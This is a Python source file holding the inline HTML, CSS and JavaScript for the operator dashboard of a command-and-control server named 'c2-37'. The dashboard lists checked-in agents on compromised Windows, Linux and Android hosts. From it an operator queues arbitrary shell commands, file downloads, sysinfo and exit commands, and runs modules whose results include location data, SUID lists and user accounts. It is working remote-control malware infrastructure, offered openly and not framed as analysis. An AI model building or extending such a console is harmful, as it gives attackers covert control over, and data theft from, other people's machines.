"""c2-37 operator dashboard — single-page web UI.

Self-contained HTML/JS/CSS dashboard served at /dashboard.
No external dependencies — everything inline.
Polls the C2 API for live updates.
"""
from __future__ import annotations

DASHBOARD_HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>c2-37 // operator</title>
<style>
:root {
    --bg: #0a0e17;
    --bg2: #111827;
    --bg3: #1a2332;
    --border: #1e3a5f;
    --text: #c9d1d9;
    --text2: #8b949e;
    --cyan: #00d4ff;
    --green: #00ff88;
    --red: #ff4757;
    --yellow: #ffd93d;
    --purple: #a855f7;
    --orange: #ff6b35;
}
* { margin: 0; padding: 0; box-sizing: border-box; }
body {
    font-family: 'JetBrains Mono', 'Fira Code', 'SF Mono', monospace;
    background: var(--bg);
    color: var(--text);
    min-height: 100vh;
}
.header {
    background: var(--bg2);
    border-bottom: 1px solid var(--border);
    padding: 12px 24px;
    display: flex;
    align-items: center;
    justify-content: space-between;
}
.header h1 {
    font-size: 18px;
    font-weight: 600;
    color: var(--cyan);
    letter-spacing: 2px;
}
.header h1 span { color: var(--text2); font-weight: 400; }
.status-bar {
    display: flex;
    gap: 20px;
    font-size: 12px;
    color: var(--text2);
}
.status-bar .live {
    color: var(--green);
    animation: pulse 2s infinite;
}
@keyframes pulse {
    0%, 100% { opacity: 1; }
    50% { opacity: 0.4; }
}
.grid {
    display: grid;
    grid-template-columns: 1fr 1fr;
    grid-template-rows: auto 1fr;
    gap: 1px;
    background: var(--border);
    height: calc(100vh - 49px);
}
.panel {
    background: var(--bg);
    display: flex;
    flex-direction: column;
    overflow: hidden;
}
.panel-header {
    background: var(--bg2);
    padding: 8px 16px;
    font-size: 11px;
    text-transform: uppercase;
    letter-spacing: 1.5px;
    color: var(--text2);
    border-bottom: 1px solid var(--border);
    display: flex;
    justify-content: space-between;
    align-items: center;
    flex-shrink: 0;
}
.panel-header .count {
    background: var(--bg3);
    padding: 2px 8px;
    border-radius: 10px;
    color: var(--cyan);
    font-size: 11px;
}
.panel-body {
    flex: 1;
    overflow-y: auto;
    padding: 8px;
}
.panel-body::-webkit-scrollbar { width: 6px; }
.panel-body::-webkit-scrollbar-track { background: var(--bg); }
.panel-body::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }

/* Agents table */
.agent-table { width: 100%; border-collapse: collapse; font-size: 12px; }
.agent-table th {
    text-align: left;
    padding: 6px 10px;
    color: var(--text2);
    font-weight: 500;
    font-size: 10px;
    text-transform: uppercase;
    letter-spacing: 1px;
    border-bottom: 1px solid var(--border);
    position: sticky;
    top: 0;
    background: var(--bg);
}
.agent-table td {
    padding: 8px 10px;
    border-bottom: 1px solid rgba(30,58,95,0.3);
    cursor: pointer;
}
.agent-table tr:hover td { background: var(--bg3); }
.agent-table tr.selected td { background: rgba(0,212,255,0.08); border-left: 2px solid var(--cyan); }
.agent-table .id { color: var(--cyan); font-weight: 600; }
.agent-table .os-win { color: var(--purple); }
.agent-table .os-linux { color: var(--green); }
.agent-table .os-android { color: var(--orange); }
.agent-table .stale { color: var(--red); }
.agent-table .fresh { color: var(--green); }

/* Command input */
.cmd-area {
    grid-column: 1 / -1;
}
.cmd-input-wrap {
    display: flex;
    align-items: center;
    background: var(--bg2);
    border-top: 1px solid var(--border);
    padding: 0;
    flex-shrink: 0;
}
.cmd-prompt {
    padding: 10px 12px;
    color: var(--red);
    font-size: 13px;
    white-space: nowrap;
    user-select: none;
}
.cmd-input {
    flex: 1;
    background: none;
    border: none;
    color: var(--text);
    font-family: inherit;
    font-size: 13px;
    padding: 10px 0;
    outline: none;
}
.cmd-input::placeholder { color: var(--text2); }

/* Results */
.result-entry {
    margin-bottom: 8px;
    border: 1px solid var(--border);
    border-radius: 4px;
    overflow: hidden;
}
.result-header {
    background: var(--bg2);
    padding: 6px 10px;
    font-size: 11px;
    display: flex;
    justify-content: space-between;
    color: var(--text2);
}
.result-header .type { color: var(--yellow); font-weight: 600; }
.result-body {
    padding: 8px 10px;
    font-size: 12px;
    white-space: pre-wrap;
    word-break: break-all;
    max-height: 200px;
    overflow-y: auto;
    line-height: 1.5;
}
.result-body .stdout { color: var(--text); }
.result-body .stderr { color: var(--red); }

/* Modules list */
.module-item {
    padding: 8px 12px;
    border-bottom: 1px solid rgba(30,58,95,0.3);
    cursor: pointer;
    font-size: 12px;
}
.module-item:hover { background: var(--bg3); }
.module-item .name { color: var(--cyan); font-weight: 600; }
.module-item .desc { color: var(--text2); margin-left: 8px; }

/* Log entries */
.log-entry {
    font-size: 11px;
    padding: 3px 8px;
    border-bottom: 1px solid rgba(30,58,95,0.15);
    line-height: 1.6;
}
.log-entry .ts { color: var(--text2); margin-right: 8px; }
.log-entry .info { color: var(--cyan); }
.log-entry .warn { color: var(--yellow); }
.log-entry .err { color: var(--red); }
.log-entry .ok { color: var(--green); }

/* Responsive */
@media (max-width: 900px) {
    .grid { grid-template-columns: 1fr; }
}

/* Empty state */
.empty {
    text-align: center;
    padding: 40px;
    color: var(--text2);
    font-size: 13px;
}
.empty .icon { font-size: 32px; margin-bottom: 12px; }
</style>
</head>
<body>

<div class="header">
    <h1>C2-37 <span>// operator dashboard</span></h1>
    <div class="status-bar">
        <span class="live" id="status-dot">&#9679; LIVE</span>
        <span id="agent-count">0 agents</span>
        <span id="uptime"></span>
    </div>
</div>

<div class="grid">
    <!-- Agents Panel -->
    <div class="panel">
        <div class="panel-header">
            <span>Agents</span>
            <span class="count" id="agents-count-badge">0</span>
        </div>
        <div class="panel-body" id="agents-panel">
            <div class="empty"><div class="icon">&#x1f6f0;</div>Waiting for agents to check in...</div>
        </div>
    </div>

    <!-- Results / Modules Panel -->
    <div class="panel">
        <div class="panel-header">
            <span id="right-panel-title">Results</span>
            <div>
                <button onclick="showResults()" style="background:var(--bg3);border:1px solid var(--border);color:var(--text);padding:2px 10px;border-radius:3px;cursor:pointer;font-family:inherit;font-size:10px;margin-right:4px">Results</button>
                <button onclick="showModules()" style="background:var(--bg3);border:1px solid var(--border);color:var(--text);padding:2px 10px;border-radius:3px;cursor:pointer;font-family:inherit;font-size:10px;margin-right:4px">Modules</button>
                <button onclick="showLog()" style="background:var(--bg3);border:1px solid var(--border);color:var(--text);padding:2px 10px;border-radius:3px;cursor:pointer;font-family:inherit;font-size:10px">Log</button>
            </div>
        </div>
        <div class="panel-body" id="right-panel">
            <div class="empty"><div class="icon">&#x1f4e1;</div>Select an agent to view results</div>
        </div>
    </div>

    <!-- Command Input -->
    <div class="cmd-area">
        <div class="cmd-input-wrap">
            <span class="cmd-prompt" id="cmd-prompt">c2-37&gt;</span>
            <input class="cmd-input" id="cmd-input" placeholder="Select an agent, then type a command... (try: help)" autocomplete="off" spellcheck="false">
        </div>
    </div>
</div>

<script>
const API = window.location.origin;
let selectedAgent = null;
let agents = [];
let results = {};
let modules = [];
let logs = [];
let rightView = 'results'; // results | modules | log
const startTime = Date.now();

function log(msg, level='info') {
    const ts = new Date().toLocaleTimeString();
    logs.push({ts, msg, level});
    if (logs.length > 200) logs.shift();
    if (rightView === 'log') renderLog();
}

function formatAgo(ts) {
    const ago = Math.floor((Date.now()/1000) - ts);
    if (ago < 60) return ago + 's';
    if (ago < 3600) return Math.floor(ago/60) + 'm' + (ago%60) + 's';
    return Math.floor(ago/3600) + 'h' + Math.floor((ago%3600)/60) + 'm';
}

function osClass(os) {
    const l = (os||'').toLowerCase();
    if (l.includes('windows')) return 'os-win';
    if (l.includes('android')) return 'os-android';
    return 'os-linux';
}

async function fetchJSON(path) {
    try {
        const r = await fetch(API + path);
        return await r.json();
    } catch(e) {
        return null;
    }
}

async function postJSON(path, data) {
    try {
        const r = await fetch(API + path, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(data)
        });
        return await r.json();
    } catch(e) {
        return null;
    }
}

// ── Render Agents ──
function renderAgents() {
    const panel = document.getElementById('agents-panel');
    if (!agents.length) {
        panel.innerHTML = '<div class="empty"><div class="icon">&#x1f6f0;</div>Waiting for agents to check in...</div>';
        return;
    }
    let html = '<table class="agent-table"><thead><tr><th>ID</th><th>Host</th><th>User</th><th>OS</th><th>Seen</th><th>Pending</th></tr></thead><tbody>';
    for (const a of agents) {
        const ago = formatAgo(a.last_seen);
        const agoSec = Math.floor((Date.now()/1000) - a.last_seen);
        const cls = a.id === selectedAgent ? 'selected' : '';
        const seenCls = agoSec > 120 ? 'stale' : 'fresh';
        html += `<tr class="${cls}" onclick="selectAgent('${a.id}')">
            <td class="id">${a.id}</td>
            <td>${a.hostname}</td>
            <td>${a.username}</td>
            <td class="${osClass(a.os)}">${(a.os||'').substring(0,22)}</td>
            <td class="${seenCls}">${ago}</td>
            <td>${a.pending_commands}</td>
        </tr>`;
    }
    html += '</tbody></table>';
    panel.innerHTML = html;

    document.getElementById('agents-count-badge').textContent = agents.length;
    document.getElementById('agent-count').textContent = agents.length + ' agent' + (agents.length!==1?'s':'');
}

// ── Render Results ──
function renderResults() {
    const panel = document.getElementById('right-panel');
    document.getElementById('right-panel-title').textContent = selectedAgent ? `Results — ${selectedAgent}` : 'Results';

    const res = results[selectedAgent] || [];
    if (!res.length) {
        panel.innerHTML = '<div class="empty"><div class="icon">&#x1f4e1;</div>' +
            (selectedAgent ? 'No results yet for ' + selectedAgent : 'Select an agent to view results') + '</div>';
        return;
    }

    let html = '';
    for (const r of res.slice().reverse()) {
        let body = '';
        if (r.stdout) body += `<span class="stdout">${escHtml(r.stdout)}</span>`;
        if (r.stderr) body += `<span class="stderr">${escHtml(r.stderr)}</span>`;
        if (r.error) body += `<span class="stderr">Error: ${escHtml(r.error)}</span>`;
        if (r.users) body += `<span class="stdout">${JSON.stringify(r.users, null, 2)}</span>`;
        if (r.data && r.type === 'download') body += `<span class="stdout">[file data: ${r.path} — ${(r.data.length * 0.75 / 1024).toFixed(1)} KB]</span>`;
        if (r.hostname && r.type === 'sysinfo') body += `<span class="stdout">${escHtml(JSON.stringify({hostname:r.hostname,username:r.username,os:r.os,pid:r.pid,cwd:r.cwd}, null, 2))}</span>`;
        if (r.location) body += `<span class="stdout">${JSON.stringify(r.location, null, 2)}</span>`;
        if (r.status && !body) body += `<span class="stdout">${escHtml(r.status)}</span>`;
        if (r.findings) body += `<span class="stdout">${JSON.stringify(r.findings, null, 2)}</span>`;
        if (r.suid) body += `<span class="stdout">${r.suid.join('\n')}</span>`;
        if (r.interfaces) body += `<span class="stdout">${escHtml(r.interfaces)}</span>`;
        if (r.processes) body += `<span class="stdout">${escHtml(r.processes.substring(0,2000))}</span>`;
        if (!body) body = `<span class="stdout">${escHtml(JSON.stringify(r, null, 2).substring(0,2000))}</span>`;

        html += `<div class="result-entry">
            <div class="result-header">
                <span class="type">${r.type || '?'}</span>
                <span>cmd_id: ${r.cmd_id || '?'}</span>
            </div>
            <div class="result-body">${body}</div>
        </div>`;
    }
    panel.innerHTML = html;
}

// ── Render Modules ──
function renderModules() {
    const panel = document.getElementById('right-panel');
    document.getElementById('right-panel-title').textContent = 'Modules';
    if (!modules.length) {
        panel.innerHTML = '<div class="empty">Loading modules...</div>';
        return;
    }
    let html = '';
    for (const m of modules) {
        html += `<div class="module-item" onclick="runModule('${m.name}')">
            <span class="name">${m.name}</span>
            <span class="desc">${m.description}</span>
        </div>`;
    }
    panel.innerHTML = html;
}

// ── Render Log ──
function renderLog() {
    const panel = document.getElementById('right-panel');
    document.getElementById('right-panel-title').textContent = 'Event Log';
    if (!logs.length) {
        panel.innerHTML = '<div class="empty">No events yet</div>';
        return;
    }
    let html = '';
    for (const l of logs.slice().reverse()) {
        html += `<div class="log-entry"><span class="ts">${l.ts}</span><span class="${l.level}">${escHtml(l.msg)}</span></div>`;
    }
    panel.innerHTML = html;
}

function showResults() { rightView = 'results'; renderResults(); }
function showModules() { rightView = 'modules'; renderModules(); }
function showLog() { rightView = 'log'; renderLog(); }

function selectAgent(id) {
    selectedAgent = id;
    document.getElementById('cmd-prompt').textContent = `c2-37(${id})>`;
    renderAgents();
    if (rightView === 'results') loadResults();
    log(`Selected agent ${id}`, 'info');
}

async function loadResults() {
    if (!selectedAgent) return;
    const data = await fetchJSON(`/api/results/${selectedAgent}`);
    if (data && data.results) {
        results[selectedAgent] = data.results;
        if (rightView === 'results') renderResults();
    }
}

async function runModule(name) {
    if (!selectedAgent) { log('Select an agent first', 'warn'); return; }
    const resp = await postJSON('/api/cmd', {agent_id: selectedAgent, type: 'module', args: {name}});
    if (resp && resp.id) {
        log(`Queued module ${name} on ${selectedAgent} (cmd=${resp.id})`, 'ok');
    } else {
        log(`Failed to queue module: ${JSON.stringify(resp)}`, 'err');
    }
}

// ── Command Input ──
document.getElementById('cmd-input').addEventListener('keydown', async (e) => {
    if (e.key !== 'Enter') return;
    const input = e.target.value.trim();
    e.target.value = '';
    if (!input) return;

    if (input === 'help') {
        log('Commands: shell <cmd>, sysinfo, sleep <sec>, download <path>, upload, exit, run <module>, modules, agents, clear', 'info');
        return;
    }
    if (input === 'clear') { logs = []; renderLog(); return; }
    if (input === 'agents') { showResults(); return; }
    if (input === 'modules') { showModules(); return; }

    if (!selectedAgent) { log('Select an agent first (click one in the table)', 'warn'); return; }

    let cmdType = 'shell', cmdArgs = {};

    if (input === 'sysinfo') {
        cmdType = 'sysinfo'; cmdArgs = {};
    } else if (input.startsWith('sleep ')) {
        cmdType = 'sleep'; cmdArgs = {sleep: parseInt(input.split(' ')[1]) || 5};
    } else if (input.startsWith('download ')) {
        cmdType = 'download'; cmdArgs = {path: input.substring(9)};
    } else if (input.startsWith('run ')) {
        cmdType = 'module'; cmdArgs = {name: input.substring(4).trim()};
    } else if (input === 'exit') {
        cmdType = 'exit'; cmdArgs = {};
    } else {
        cmdType = 'shell'; cmdArgs = {cmd: input};
    }

    const resp = await postJSON('/api/cmd', {agent_id: selectedAgent, type: cmdType, args: cmdArgs});
    if (resp && resp.id) {
        log(`[${selectedAgent}] queued ${cmdType}: ${JSON.stringify(cmdArgs).substring(0,80)}`, 'ok');
    } else {
        log(`Failed: ${JSON.stringify(resp)}`, 'err');
    }
});

function escHtml(s) {
    if (!s) return '';
    return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}

// ── Polling Loop ──
async function poll() {
    const data = await fetchJSON('/api/agents');
    if (data && data.agents) {
        const prevCount = agents.length;
        agents = data.agents;
        renderAgents();
        if (agents.length > prevCount) {
            log(`New agent checked in! (${agents.length} total)`, 'ok');
        }
    }

    if (selectedAgent && rightView === 'results') {
        await loadResults();
    }

    // Load modules once
    if (!modules.length) {
        const mdata = await fetchJSON('/api/modules');
        if (mdata && mdata.modules) {
            modules = mdata.modules;
            if (rightView === 'modules') renderModules();
        }
    }

    // Update uptime
    const up = Math.floor((Date.now() - startTime) / 1000);
    const h = Math.floor(up/3600), m = Math.floor((up%3600)/60), s = up%60;
    document.getElementById('uptime').textContent = `${h}h ${m}m ${s}s`;
}

log('Dashboard initialized', 'ok');
log('Polling C2 API...', 'info');
poll();
setInterval(poll, 3000);

// Focus input
document.getElementById('cmd-input').focus();
document.addEventListener('keydown', (e) => {
    if (e.key === '/' && document.activeElement !== document.getElementById('cmd-input')) {
        e.preventDefault();
        document.getElementById('cmd-input').focus();
    }
});
</script>
</body>
</html>"""


def get_dashboard_html() -> str:
    """Return the dashboard HTML."""
    return DASHBOARD_HTML
